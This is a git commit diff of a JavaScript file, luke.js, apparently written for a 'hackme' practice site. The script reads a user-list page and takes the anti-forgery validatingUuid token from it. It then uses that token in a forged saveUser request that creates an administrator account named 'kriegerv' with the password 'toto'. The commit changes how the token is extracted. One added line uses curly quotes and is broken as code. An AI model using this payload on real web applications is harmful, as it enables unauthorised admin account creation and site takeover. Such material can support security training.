d4e54b6ed8519a70532262c93d74a65316a3b98c
enopeus <enopeus@gmail.com>
2014-11-25 23:32:22 +0100

    Update luke.js

--- luke.js
+++ luke.js
@@ -5,12 +5,15 @@ if (!req) try { req = new ActiveXObject("Msxml2.XMLHTTP"); } catch(e) {}
 if (!req) try { req = new ActiveXObject("Microsoft.XMLHTTP"); } catch(e) {}
 req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/listUsers', false);
 req.send(null);
+var response = req.responseXML.documentElement;
+var Uuid = response.getElementsByTagName(’validatingUuid’)[0].firstChild.data;
+console.log("x." + Uuid);
 console.log("1." + req.responseText);
 if(req.responseText){
-var validatingUuid = $(req.responseText).add("[name='validatingUuid']")[1].value;
+var validatingUuid = $(req.responseText).add("[name='validatingUuid']")[0].value;
 console.log("2." + validatingUuid);
 if(validatingUuid){
-var validatingUuidValue = $("[name='validatingUuid']")[1].value;
+var validatingUuidValue = $("[name='validatingUuid']")[0].value;
 console.log("3." + validatingUuidValue);
 req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/saveUser?name=kriegerv&password=toto&admin=true&id=-1&validatingUuid='+ validatingUuid, false);
 req.send(null);
